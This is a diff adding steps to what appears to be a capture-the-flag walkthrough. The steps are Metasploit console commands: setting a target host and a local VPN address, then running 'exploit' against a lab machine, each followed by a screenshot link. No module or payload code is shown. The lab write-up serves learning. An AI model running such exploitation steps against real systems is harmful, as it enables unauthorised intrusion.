@@ -99,6 +99,29 @@ Open Metasploit:
 
 ![Screenshot from 2023-04-08 23-07-42](https://user-images.githubusercontent.com/120317751/230735593-68a0f040-4ab9-46b3-9bc8-70887c84b3a6.png)
 
+         options
+         
+         
+![Screenshot from 2023-04-08 23-16-11](https://user-images.githubusercontent.com/120317751/230735732-909b6421-e649-4217-8ba4-8e3a42a36b57.png)
+
+
+         set rhosts 10.10.95.145
+         
+
+![Screenshot from 2023-04-08 23-20-04](https://user-images.githubusercontent.com/120317751/230735882-24c8babc-0dfc-4cbd-af1b-5b288719d988.png)
+
+
+         set lhost 10.8.83.18     (VPN IP)
+         
+         
+![Screenshot from 2023-04-08 23-23-50](https://user-images.githubusercontent.com/120317751/230736078-6b5e8588-b71c-4af7-879d-6d1d22100e60.png)
+
+          exploit
+          
+          
+![Screenshot from 2023-04-08 23-29-47](https://user-images.githubusercontent.com/120317751/230736204-cb2c9eb3-8e8a-4399-aec3-5580e8aaf839.png)
+
+
 
  
 <b><H2>Task 3 Gain Access</b></H2>   
